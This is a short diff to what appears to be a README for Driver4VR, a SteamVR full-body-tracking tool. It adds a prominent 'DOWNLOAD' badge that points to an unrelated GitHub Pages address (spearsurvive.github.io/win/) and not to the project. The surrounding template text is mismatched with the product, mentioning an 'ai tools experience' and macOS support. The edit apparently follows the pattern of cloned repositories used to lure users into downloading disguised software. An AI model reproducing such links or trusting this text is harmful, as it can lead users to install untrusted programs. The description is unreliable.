@@ -30,6 +30,12 @@ Driver4VR adds full body tracking to SteamVR using a Kinect sensor, smartphones,
 
 Whether you're a newcomer or a veteran, Driver4VR provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Driver4VR](https://img.shields.io/badge/⬇_DOWNLOAD_Driver4VR-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
